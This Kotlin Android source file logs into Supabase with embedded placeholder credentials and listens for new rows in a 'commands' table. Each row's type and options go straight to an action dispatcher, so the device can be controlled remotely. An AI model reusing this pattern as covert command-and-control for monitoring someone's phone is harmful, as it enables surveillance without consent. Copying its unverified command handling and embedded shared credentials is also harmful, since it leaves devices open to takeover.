package com.save.me

import android.content.Context
import android.util.Log
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.storage.Storage
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.postgresChangeFlow
import io.github.jan.supabase.auth.Auth
import io.github.jan.supabase.auth.signInWith
import io.github.jan.supabase.auth.providers.Email
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.launch
import org.json.JSONObject

object SupabaseRemoteControl {
    private const val SUPABASE_URL = "YOUR_SUPABASE_URL"
    private const val SUPABASE_KEY = "YOUR_SUPABASE_ANON_KEY"
    private const val EMAIL = "your_email@example.com"
    private const val PASSWORD = "your_password"

    private var client: SupabaseClient? = null
    private var scope: CoroutineScope? = null
    private var connected = false

    fun isConnected() = connected

    fun getClient(): SupabaseClient {
        requireNotNull(client) { "Supabase client not initialized!" }
        return client!!
    }

    fun ensureLoginAndListener(context: Context) {
        if (client != null && connected) return
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        client = createSupabaseClient(
            supabaseUrl = SUPABASE_URL,
            supabaseKey = SUPABASE_KEY
        ) {
            install(Postgrest)
            install(Storage)
            install(Realtime)
            install(Auth)
        }

        scope!!.launch {
            try {
                client!!.auth.signInWith(Email) {
                    email = EMAIL
                    password = PASSWORD
                }
                connected = true
                listen(context)
            } catch (e: Exception) {
                connected = false
                Log.e("SupabaseRemoteControl", "Login failed: $e")
            }
        }
    }

    private fun listen(context: Context) {
        val channel = client!!.channel("public:commands")
        channel.postgresChangeFlow<io.github.jan.supabase.realtime.PostgresAction.Insert>("public") {
            table = "commands"
        }
            .onEach { action ->
                val type = action.record["type"] as? String ?: return@onEach
                val optionsJson = action.record["options"]?.toString()
                val options = if (optionsJson != null) JSONObject(optionsJson) else JSONObject()
                ActionHandlers.dispatch(context, type, options)
            }
            .catch { e -> Log.e("SupabaseRemoteControl", "Realtime error: $e") }
            .launchIn(scope!!)
    }
}